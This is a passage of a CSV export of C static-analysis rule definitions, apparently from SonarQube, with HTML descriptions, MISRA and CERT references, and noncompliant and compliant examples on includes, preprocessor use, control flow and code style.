  <li> MISRA C:2012, 20.2 - The ', "" or \ characters and the /* or // character sequences shall not occur in a header file name </li>
</ul>",c:PPIncludeNonStandardCharacters,c,C,"<p>If the <code>'</code>, <code>\</code>, <code>""</code> or <code>/*</code> characters are used between <code>&lt;</code> and <code>&gt;</code>
delimiters or the <code>'</code>, <code>\</code> or <code>/*</code> characters are used between the <code>""</code> delimiters in a header name
preprocessing token, then the behavior is undefined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;""foo""&gt;     // Noncompliant
#include ""dir\foo.h"" // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.2 - Non-standard characters should not occur in header file names in #include directives. </li>
  <li> MISRA C++:2008, 16-2-4 - The ', "", /* or // characters shall not occur in a header file name. </li>
  <li> MISRA C++:2008, 16-2-5 - The \ character should not occur in a header file name. </li>
  <li> MISRA C:2012, 20.2 - The ', "" or \ characters and the /* or // character sequences shall not occur in a header file name </li>
</ul>","Non-standard characters should not occur in header file names in ""#include"" directives",[],MAJOR,['misra'],BUG
2013-09-16T11:41:23+0200,"<p>To aid code readability, all the <code>#include</code> directives in a particular code file should be grouped together near the top of the file.
The only items which may precede an <code>#include</code> in a file are other preprocessor directives or comments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;h1.h&gt; /* Compliant */
int32_t i;
#include &lt;f2.h&gt; /* Noncompliant */
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;h1.h&gt;
#include &lt;f2.h&gt;

int32_t i;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.1 - #include statements in a file should only be preceded by other preprocessor directives or comments. </li>
  <li> MISRA C++:2008, 16-0-1 - #include directives in a file shall only be preceded by other preprocessor directives or comments. </li>
  <li> MISRA C:2012, 20.1 - #include directives should only be preceded by preprocessor directives or comments </li>
</ul>",c:PPIncludeNotAtTop,c,C,"<p>To aid code readability, all the <code>#include</code> directives in a particular code file should be grouped together near the top of the file.
The only items which may precede an <code>#include</code> in a file are other preprocessor directives or comments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;h1.h&gt; /* Compliant */
int32_t i;
#include &lt;f2.h&gt; /* Noncompliant */
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;h1.h&gt;
#include &lt;f2.h&gt;

int32_t i;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.1 - #include statements in a file should only be preceded by other preprocessor directives or comments. </li>
  <li> MISRA C++:2008, 16-0-1 - #include directives in a file shall only be preceded by other preprocessor directives or comments. </li>
  <li> MISRA C:2012, 20.1 - #include directives should only be preceded by preprocessor directives or comments </li>
</ul>",#include directives in a file should only be preceded by other preprocessor directives or comments,[],MAJOR,"['confusing', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Signal handling contains implementation-defined and undefined behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;signal.h&gt; /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 20.8 - The signal handling facilities of &lt;signal.h&gt; shall not be used. </li>
  <li> MISRA C:2012, 21.5 - The standard header file &lt;signal.h&gt; shall not be used </li>
</ul>",c:PPIncludeSignal,c,C,"<p>Signal handling contains implementation-defined and undefined behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;signal.h&gt; /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 20.8 - The signal handling facilities of &lt;signal.h&gt; shall not be used. </li>
  <li> MISRA C:2012, 21.5 - The standard header file &lt;signal.h&gt; shall not be used </li>
</ul>","""<signal.h>"" should not be used",[],CRITICAL,"['lock-in', 'misra']",BUG
2013-09-16T11:41:23+0200,"<p>This includes file and I/O functions <code>fgetpos</code>, <code>fopen</code>, <code>ftell</code>, <code>gets</code>, <code>perror</code>,
<code>remove</code>, <code>rename</code> and <code>ungetc</code>.</p>
<p>Streams and file I/O have a large number of unspecified, undefined and implementation-defined behaviors associated with them. It is assumed within
MISRA C that they will not normally be needed in production code in embedded systems.</p>
<p>If any of the features of <code>stdio.h</code> need to be used in production code, then the issues associated with the features need to be
understood.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;stdio.h&gt; /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 20.9 - The input/output library &lt;stdio.h&gt; shall not be used in production code. </li>
  <li> MISRA C++:2008, 27-0-1 - The stream input/output library &lt;cstdio&gt; shall not be used. </li>
  <li> MISRA C:2012, 21.6 - The Standard Library input/output functions shall not be used </li>
</ul>",c:PPIncludeStdio,c,C,"<p>This includes file and I/O functions <code>fgetpos</code>, <code>fopen</code>, <code>ftell</code>, <code>gets</code>, <code>perror</code>,
<code>remove</code>, <code>rename</code> and <code>ungetc</code>.</p>
<p>Streams and file I/O have a large number of unspecified, undefined and implementation-defined behaviors associated with them. It is assumed within
MISRA C that they will not normally be needed in production code in embedded systems.</p>
<p>If any of the features of <code>stdio.h</code> need to be used in production code, then the issues associated with the features need to be
understood.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;stdio.h&gt; /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 20.9 - The input/output library &lt;stdio.h&gt; shall not be used in production code. </li>
  <li> MISRA C++:2008, 27-0-1 - The stream input/output library &lt;cstdio&gt; shall not be used. </li>
  <li> MISRA C:2012, 21.6 - The Standard Library input/output functions shall not be used </li>
</ul>","""<stdio.h>"" should not be used in production code",[],CRITICAL,"['lock-in', 'misra']",BUG
2013-09-16T11:41:23+0200,"<p>Includes <code>time</code>, <code>strftime</code>. This library is associated with clock times. Various aspects are implementation dependent or
unspecified, such as the formats of times. If any of the facilities of <code>time.h</code> are used, then the exact implementation for the compiler
being used must be determined, and a deviation raised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;time.h&gt;  /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 20.12 - The time handling functions of library &lt;time.h&gt; shall not be used. </li>
  <li> MISRA C:2012, 21.10 - The Standard Library time and date functions shall not be used </li>
</ul>",c:PPIncludeTime,c,C,"<p>Includes <code>time</code>, <code>strftime</code>. This library is associated with clock times. Various aspects are implementation dependent or
unspecified, such as the formats of times. If any of the facilities of <code>time.h</code> are used, then the exact implementation for the compiler
being used must be determined, and a deviation raised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;time.h&gt;  /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 20.12 - The time handling functions of library &lt;time.h&gt; shall not be used. </li>
  <li> MISRA C:2012, 21.10 - The Standard Library time and date functions shall not be used </li>
</ul>","""<time.h>"" should not be used",[],CRITICAL,"['lock-in', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all macro
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define foo // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
#define FOO
</pre>",c:PPMacroName,c,C,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all macro
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define foo // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
#define FOO
</pre>",Macro names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the macro names against.', 'defaultValue': '[A-Z][A-Z0-9_]*', 'type': 'STRING'}]",MINOR,"['convention', 'preprocessor']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The evaluation order of both the <code>#</code> and <code>##</code> preprocessor operators is unspecified. Compilers have been known to implement
these operators inconsistently, therefore, to avoid these problems, do not use them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define A(Y)   #Y    /* Noncompliant */
#define A(X,Y) X##Y  /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.13 - The # and ## preprocessor operators should not be used. </li>
  <li> MISRA C++:2008, 16-3-2 - The # and ## operators should not be used. </li>
  <li> MISRA C:2012, 20.10 - The # and ## preprocessor operators should not be used </li>
</ul>",c:PPStringifyAndPastingUsage,c,C,"<p>The evaluation order of both the <code>#</code> and <code>##</code> preprocessor operators is unspecified. Compilers have been known to implement
these operators inconsistently, therefore, to avoid these problems, do not use them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define A(Y)   #Y    /* Noncompliant */
#define A(X,Y) X##Y  /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.13 - The # and ## preprocessor operators should not be used. </li>
  <li> MISRA C++:2008, 16-3-2 - The # and ## operators should not be used. </li>
  <li> MISRA C:2012, 20.10 - The # and ## preprocessor operators should not be used </li>
</ul>","Preprocessor operators ""#"" and ""##"" should not be used",[],MINOR,"['lock-in', 'misra']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p><code>#undef</code> should not normally be needed. Its use can lead to confusion with respect to the existence or meaning of a macro when it is
used in the code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#ifndef MY_HDR
#define MY_HDR
#endif
...
#undef MY_HDR    /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.6 - #undef shall not be used. </li>
  <li> MISRA C++:2008, 16-0-3 - #undef shall not be used. </li>
  <li> MISRA C:2012, 20.5 - #undef should not be used </li>
</ul>",c:PPUndefUsage,c,C,"<p><code>#undef</code> should not normally be needed. Its use can lead to confusion with respect to the existence or meaning of a macro when it is
used in the code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#ifndef MY_HDR
#define MY_HDR
#endif
...
#undef MY_HDR    /* Noncompliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.6 - #undef shall not be used. </li>
  <li> MISRA C++:2008, 16-0-3 - #undef shall not be used. </li>
  <li> MISRA C:2012, 20.5 - #undef should not be used </li>
</ul>","""#undef"" should not be used",[],CRITICAL,"['brain-overload', 'misra']",CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: <code>[a-z][a-zA-Z0-9]*</code>:</p>
<pre>
void DoSomething (void);
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething (void);
</pre>",c:S100,c,C,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: <code>[a-z][a-zA-Z0-9]*</code>:</p>
<pre>
void DoSomething (void);
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething (void);
</pre>",Function names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the function names against', 'defaultValue': '[a-z][a-zA-Z0-9]*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-11-07T16:16:36+0100,"<p>Having a <code>switch</code> and its cases wholly encompassed by a control structure such as a <code>try</code>, <code>@try</code>,
<code>catch</code>, <code>@catch</code>, or a loop is perfectly acceptable. (<code>try</code> and <code>catch</code> are used hereafter to refer to
both variants.) It is also acceptable to have a <code>goto</code> and its target label wholly encompassed in a control structure. </p>
<p>What is not acceptable is using a <code>goto</code> or <code>case</code> to suddenly jump into the body of a <code>try</code>, <code>catch</code>,
Objective-C <code>@finally</code>, or loop structure. Tangling labels or <code>switch</code> blocks with other control structures results in code that
is difficult, if not impossible to understand. More importantly, when it compiles (some of these constructs won't compile under ISO-conformant
compilers), it can lead to unexpected results. Therefore this usage should be strictly avoided.</p>
<p>This C++ code sample, which is also applicable to Objective-C if <code>try</code> and <code>catch</code> are converted to <code>@try</code> and
<code>@catch</code>, demonstrates jumping into a <code>switch</code> and into a <code>try</code> and <code>catch</code> :</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f ( int32_t i )
{
  if ( 10 == i )
  {
    goto Label_10; // Noncompliant; goto transfers control into try block
  }

  if ( 11 == i )
  {
    goto Label_11; // Noncompliant; goto transfers control into catch block
  }

  switch ( i )
  {
    case 1:
      try
      {
        Label_10:
        case 2:  // Noncompliant; switch transfers control into try block
          // Action
          break;
      }
      catch ( ... )
      {
        Label_11:
        case 3: // Noncompliant; switch transfers control into catch block
          // Action
          break;
      }
      break;
    default:
    {
      // Default Action
      break;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f ( int32_t i )
{
  switch ( i )
  {
    case 1:
    case 2:
      // Action
      break;
    case 3:
      // Action
      break;
    case 10:

    default:
    {
      // Default Action
      break;
    }
  }

  try
  {
    if ( 2 == i || 10 == i)
    {
      // Action
    }
  }
  catch ( ... )
  {
    if (3 == i || 11 == i)
    {
      // Action
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-0-3 - Control shall not be transferred into a try or catch block using goto or switch statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/DgDFAQ"">CERT, MSC20-C.</a> - Do not use a switch statement to transfer control into a
  complex block </li>
</ul>",c:S1036,c,C,"<p>Having a <code>switch</code> and its cases wholly encompassed by a control structure such as a <code>try</code>, <code>@try</code>,
<code>catch</code>, <code>@catch</code>, or a loop is perfectly acceptable. (<code>try</code> and <code>catch</code> are used hereafter to refer to
both variants.) It is also acceptable to have a <code>goto</code> and its target label wholly encompassed in a control structure. </p>
<p>What is not acceptable is using a <code>goto</code> or <code>case</code> to suddenly jump into the body of a <code>try</code>, <code>catch</code>,
Objective-C <code>@finally</code>, or loop structure. Tangling labels or <code>switch</code> blocks with other control structures results in code that
is difficult, if not impossible to understand. More importantly, when it compiles (some of these constructs won't compile under ISO-conformant
compilers), it can lead to unexpected results. Therefore this usage should be strictly avoided.</p>
<p>This C++ code sample, which is also applicable to Objective-C if <code>try</code> and <code>catch</code> are converted to <code>@try</code> and
<code>@catch</code>, demonstrates jumping into a <code>switch</code> and into a <code>try</code> and <code>catch</code> :</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f ( int32_t i )
{
  if ( 10 == i )
  {
    goto Label_10; // Noncompliant; goto transfers control into try block
  }

  if ( 11 == i )
  {
    goto Label_11; // Noncompliant; goto transfers control into catch block
  }

  switch ( i )
  {
    case 1:
      try
      {
        Label_10:
        case 2:  // Noncompliant; switch transfers control into try block
          // Action
          break;
      }
      catch ( ... )
      {
        Label_11:
        case 3: // Noncompliant; switch transfers control into catch block
          // Action
          break;
      }
      break;
    default:
    {
      // Default Action
      break;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f ( int32_t i )
{
  switch ( i )
  {
    case 1:
    case 2:
      // Action
      break;
    case 3:
      // Action
      break;
    case 10:

    default:
    {
      // Default Action
      break;
    }
  }

  try
  {
    if ( 2 == i || 10 == i)
    {
      // Action
    }
  }
  catch ( ... )
  {
    if (3 == i || 11 == i)
    {
      // Action
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-0-3 - Control shall not be transferred into a try or catch block using goto or switch statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/DgDFAQ"">CERT, MSC20-C.</a> - Do not use a switch statement to transfer control into a
  complex block </li>
</ul>","Control should not be transferred into a complex logic block using a ""goto"" or a ""switch"" statement",[],BLOCKER,"['cert', 'lock-in', 'misra', 'pitfall']",CODE_SMELL
2015-01-15T09:18:32+0100,"<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>
<p>This will improve maintainability as developers will not wonder what this label is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void fun() {
  label: doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void fun() {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 2.6 - A function should not contain unused label declarations </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",c:S1065,c,C,"<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>
<p>This will improve maintainability as developers will not wonder what this label is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void fun() {
  label: doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void fun() {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 2.6 - A function should not contain unused label declarations </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Unused labels should be removed,[],MAJOR,"['cert', 'misra', 'unused']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  if (condition2) {             // NonCompliant
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2) { // Compliant
  /* ... */
}
</pre>",c:S1066,c,C,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  if (condition2) {             // NonCompliant
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2) { // Compliant
  /* ... */
}
</pre>","Collapsible ""if"" statements should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value 3.</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>",c:S1067,c,C,"<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value 3.</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }
</pre>",Expressions should not be too complex,"[{'key': 'max', 'htmlDesc': 'Maximum number of allowed conditional operators in an expression', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
void doSomething(int param1, int param2, int param3, int param4, int param5) {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int param1, int param2, int param3, int param4) {
  ...
}
</pre>",c:S107,c,C,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
void doSomething(int param1, int param2, int param3, int param4, int param5) {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int param1, int param2, int param3, int param4) {
  ...
}
</pre>",Functions should not have too many parameters,"[{'key': 'max', 'htmlDesc': 'Maximum authorized number of parameters', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Defining a nested single-line comment within a multi-line comment invites errors. It may lead a developer to wrongly think that the lines located
after the single-line comment are not part of the comment.</p>
<p>If a comment starting sequence, <code>/*</code> or <code>//</code>, occurs within a <code>/*</code> comment, is it quite likely to be caused by a
missing <code>*/</code> comment ending sequence.</p>
<p>If a comment starting sequence occurs within a <code>//</code> comment, it is probably because a region of code has been commented-out using
<code>//</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* some comment, end comment marker accidentally omitted
// Make sure this function is called in a thread safe context
Perform_Critical_Safety_Function(X);
...
/* this comment is non-compliant */
</pre>
<h2>Exceptions</h2>
<p>The sequence // is permitted within a // comment.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/x/k9YxBQ"">CERT, MSC04-C.</a> - Use comments consistently and in a readable fashion </li>
  <li> MISRA C:2004, 2.3 - The character sequence /* shall not be used within a comment. </li>
  <li> MISRA C++:2008, 2-7-1 - The character sequence /* shall not be used within a C-style comment. </li>
  <li> MISRA C:2012, 3.1 - The character sequences /* and // shall not be used within a comment </li>
</ul>",c:S1103,c,C,"<p>Defining a nested single-line comment within a multi-line comment invites errors. It may lead a developer to wrongly think that the lines located
after the single-line comment are not part of the comment.</p>
<p>If a comment starting sequence, <code>/*</code> or <code>//</code>, occurs within a <code>/*</code> comment, is it quite likely to be caused by a
missing <code>*/</code> comment ending sequence.</p>
<p>If a comment starting sequence occurs within a <code>//</code> comment, it is probably because a region of code has been commented-out using
<code>//</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* some comment, end comment marker accidentally omitted
// Make sure this function is called in a thread safe context
Perform_Critical_Safety_Function(X);
...
/* this comment is non-compliant */
</pre>
<h2>Exceptions</h2>
<p>The sequence // is permitted within a // comment.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/x/k9YxBQ"">CERT, MSC04-C.</a> - Use comments consistently and in a readable fashion </li>
  <li> MISRA C:2004, 2.3 - The character sequence /* shall not be used within a comment. </li>
  <li> MISRA C++:2008, 2-7-1 - The character sequence /* shall not be used within a C-style comment. </li>
  <li> MISRA C:2012, 3.1 - The character sequences /* and // shall not be used within a comment </li>
</ul>","""/*"" and ""//"" should not be used within comments",[],MINOR,"['cert', 'confusing', 'misra']",CODE_SMELL
2017-04-11T12:32:42+0200,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>
<h2>Exceptions</h2>
<p>When the result of an assignment is used as a condition, clang raises a warning to make sure the purpose was not to use <code>==</code> in place of
<code>=</code>. Adding some parentheses around the assignment is a common way to silence this clang warning. So, no issue is raised in such case.</p>
<pre>
if ((x = 7)) {} // Compliant
</pre>",c:S1110,c,C,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>
<h2>Exceptions</h2>
<p>When the result of an assignment is used as a condition, clang raises a warning to make sure the purpose was not to use <code>==</code> in place of
<code>=</code>. Adding some parentheses around the assignment is a common way to silence this clang warning. So, no issue is raised in such case.</p>
<pre>
if ((x = 7)) {} // Compliant
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2016-11-14T16:47:21+0100,"<p>The <code>deprecated</code> attribute can be applied with or without explanations, but marking something <code>deprecated</code> without including
advice as to why it's deprecated or on what to use instead will lead maintainers to waste time trying to figure those things out - every single time
the warning is encountered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[[deprecated]] // Noncompliant
void foo1();

__attribute__((deprecated)) // Noncompliant
void foo2();

__declspec(deprecated) // Noncompliant
void foo3();
</pre>
<h2>Compliant Solution</h2>
<pre>
[[deprecated(""use 'bar' instead"")]]
void foo1();

__attribute__((deprecated(""use 'bar' instead"")))
void foo2();

__declspec(deprecated(""use 'bar' instead""))
void foo3();
</pre>",c:S1123,c,C,"<p>The <code>deprecated</code> attribute can be applied with or without explanations, but marking something <code>deprecated</code> without including
advice as to why it's deprecated or on what to use instead will lead maintainers to waste time trying to figure those things out - every single time
the warning is encountered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[[deprecated]] // Noncompliant
void foo1();

__attribute__((deprecated)) // Noncompliant
void foo2();

__declspec(deprecated) // Noncompliant
void foo3();
</pre>
<h2>Compliant Solution</h2>
<pre>
[[deprecated(""use 'bar' instead"")]]
void foo1();

__attribute__((deprecated(""use 'bar' instead"")))
void foo2();

__declspec(deprecated(""use 'bar' instead""))
void foo3();
</pre>",Deprecated attributes should include explanations,[],MAJOR,"['bad-practice', 'obsolete']",CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>",c:S113,c,C,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>",Files should contain an empty newline at the end,[],MINOR,['convention'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>",c:S1131,c,C,"<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>",Lines should not end with trailing whitespaces,[],MINOR,['convention'],CODE_SMELL
2015-11-05T15:08:10+0100,"<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// C++14 attribute
[[deprecated]] // Noncompliant
void fun();

// GNU attribute
__attribute__((deprecated)) // Noncompliant
void fun();

// Microsoft attribute
__declspec(deprecated) // Noncompliant
void fun();
</pre>",c:S1133,c,C,"<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// C++14 attribute
[[deprecated]] // Noncompliant
void fun();

// GNU attribute
__attribute__((deprecated)) // Noncompliant
void fun();

// Microsoft attribute
__declspec(deprecated) // Noncompliant
void fun();
</pre>",Deprecated code should be removed,[],INFO,['obsolete'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int divide(int numerator, int denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",c:S1134,c,C,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int divide(int numerator, int denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",c:S1135,c,C,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2015-11-05T15:08:10+0100,"<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
